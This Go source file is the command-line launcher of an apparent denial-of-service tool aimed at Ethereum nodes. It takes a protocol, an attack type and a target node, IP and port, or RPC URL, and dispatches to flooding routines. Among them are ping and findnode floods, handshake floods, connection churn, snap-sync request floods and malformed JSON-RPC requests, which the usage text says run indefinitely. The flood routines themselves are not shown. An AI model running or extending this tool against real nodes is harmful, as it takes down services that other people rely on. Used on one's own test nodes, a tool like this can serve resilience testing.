package main

import (
	"fmt"
	"os"
	"strconv"

	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/p2p/enode"
)

func printUsage() {
	fmt.Println("Usage: go run main.go <protocol> <attack_type> <target_node> [<port>|<method>]")
	fmt.Println("protocol: devp2p, eth, p2p, rlpx, snap, or rpc")
	fmt.Println("attack_type:")
	fmt.Println("  devp2p: ping, findnode, talk, pingv4, findnodev4, enrrequestv4,")
	fmt.Println("          ping-single, findnode-single, talk-single,")
	fmt.Println("          pingv4-single, findnodev4-single, enrrequestv4-single")
	fmt.Println("  eth: status, newblockhashes, transactions, getblockheaders, getblockbodies, newblock, newpooledtxhashes, getpooledtxs, getreceipts, handshakeflood")
	fmt.Println("  p2p: pingflood, pongflood, pingpongflood")
	fmt.Println("  rlpx: handshakeflood, churn")
	fmt.Println("  snap: getaccountrange, getstorageranges, getbytecodes, gettrienodes")
	fmt.Println("  rpc: httpflood, malformed")
	fmt.Println("Notes:")
	fmt.Println("  - All attacks run indefinitely until manually stopped (Ctrl+C)")
	fmt.Println("  - Single-request tests send one request and wait for response")
	fmt.Println("  - For rlpx, provide <target_ip> <port>")
	fmt.Println("  - For rpc, provide <target_url> [<method>] (method required for httpflood)")
}

func main() {
	// Initialize logging
	log.SetDefault(log.NewLogger(log.NewTerminalHandlerWithLevel(os.Stderr, log.LevelInfo, true)))

	if len(os.Args) < 4 {
		printUsage()
		os.Exit(1)
	}

	protocol := os.Args[1]
	attackType := os.Args[2]
	target := os.Args[3]

	var attackErr error

	switch protocol {
	case "devp2p":
		node, err := enode.Parse(enode.ValidSchemes, target)
		if err != nil {
			fmt.Printf("Invalid node URL: %v\n", err)
			os.Exit(1)
		}
		switch attackType {
		case "ping":
			attackErr = PingDOS(node)
		case "findnode":
			attackErr = FindnodeDOS(node)
		case "talk":
			attackErr = TalkRequestDOS(node)
		case "pingv4":
			attackErr = PingV4DOS(node)
		case "findnodev4":
			attackErr = FindnodeV4DOS(node)
		case "enrrequestv4":
			attackErr = ENRRequestV4DOS(node)
		case "ping-single":
			attackErr = PingSingle(node)
		case "findnode-single":
			attackErr = FindnodeSingle(node)
		case "talk-single":
			attackErr = TalkRequestSingle(node)
		case "pingv4-single":
			attackErr = PingV4Single(node)
		case "findnodev4-single":
			attackErr = FindnodeV4Single(node)
		case "enrrequestv4-single":
			attackErr = ENRRequestV4Single(node)
		default:
			fmt.Printf("Unknown devp2p attack type: %s\n", attackType)
			os.Exit(1)
		}
	case "eth":
		node, err := enode.Parse(enode.ValidSchemes, target)
		if err != nil {
			fmt.Printf("Invalid node URL: %v\n", err)
			os.Exit(1)
		}

		switch attackType {
		case "status":
			attackErr = executeAttackWithRetry(node, StatusDOS)
		case "newblockhashes":
			attackErr = executeAttackWithRetry(node, NewBlockHashesDOS)
		case "transactions":
			attackErr = executeAttackWithRetry(node, TransactionsDOS)
		case "getblockheaders":
			attackErr = executeAttackWithRetry(node, GetBlockHeadersDOS)
		case "getblockbodies":
			attackErr = executeAttackWithRetry(node, GetBlockBodiesDOS)
		case "newblock":
			attackErr = executeAttackWithRetry(node, NewBlockDOS)
		case "newpooledtxhashes":
			attackErr = executeAttackWithRetry(node, NewPooledTransactionHashesDOS)
		case "getpooledtxs":
			attackErr = executeAttackWithRetry(node, GetPooledTransactionsDOS)
		case "getreceipts":
			attackErr = executeAttackWithRetry(node, GetReceiptsDOS)
		case "handshakeflood":
			attackErr = executeAttackWithRetry(node, ProtocolHandshakeFloodDOS)
		default:
			fmt.Printf("Unknown eth attack type: %s\n", attackType)
			os.Exit(1)
		}
	case "p2p":
		node, err := enode.Parse(enode.ValidSchemes, target)
		if err != nil {
			fmt.Printf("Invalid node URL: %v\n", err)
			os.Exit(1)
		}

		switch attackType {
		case "pingflood":
			attackErr = executeAttackWithRetry(node, PingFloodDOS)
		case "pongflood":
			attackErr = executeAttackWithRetry(node, PongFloodDOS)
		case "pingpongflood":
			attackErr = executeAttackWithRetry(node, PingPongFloodDOS)
		default:
			fmt.Printf("Unknown p2p attack type: %s\n", attackType)
			os.Exit(1)
		}
	case "rlpx":
		if len(os.Args) < 5 {
			fmt.Println("Usage for rlpx: go run main.go rlpx <attack_type> <target_ip> <port>")
			os.Exit(1)
		}
		targetIP := os.Args[3]
		port, err := strconv.Atoi(os.Args[4])
		if err != nil {
			fmt.Printf("Invalid port: %v\n", err)
			os.Exit(1)
		}
		switch attackType {
		case "handshakeflood":
			attackErr = HandshakeFloodDOS(targetIP, port)
		case "churn":
			attackErr = ConnectionChurnDOS(targetIP, port)
		default:
			fmt.Printf("Unknown rlpx attack type: %s\n", attackType)
			os.Exit(1)
		}
	case "snap":
		node, err := enode.Parse(enode.ValidSchemes, target)
		if err != nil {
			fmt.Printf("Invalid node URL: %v\n", err)
			os.Exit(1)
		}
		switch attackType {
		case "getaccountrange":
			attackErr = GetAccountRangeDOS(node)
		case "getstorageranges":
			attackErr = GetStorageRangesDOS(node)
		case "getbytecodes":
			attackErr = GetByteCodesDOS(node)
		case "gettrienodes":
			attackErr = GetTrieNodesDOS(node)
		default:
			fmt.Printf("Unknown snap attack type: %s\n", attackType)
			os.Exit(1)
		}
	case "rpc":
		if attackType == "httpflood" {
			if len(os.Args) < 5 {
				fmt.Println("Usage for rpc httpflood: go run main.go rpc httpflood <target_url> <method>")
				os.Exit(1)
			}
			method := os.Args[4]
			attackErr = HTTPRPCCallFloodDOS(target, method)
		} else if attackType == "malformed" {
			attackErr = MalformedJSONRPCDOS(target)
		} else {
			fmt.Printf("Unknown rpc attack type: %s\n", attackType)
			os.Exit(1)
		}
	default:
		fmt.Printf("Unknown protocol: %s\n", protocol)
		os.Exit(1)
	}

	if attackErr != nil {
		fmt.Printf("Attack failed: %v\n", attackErr)
		os.Exit(1)
	}
}
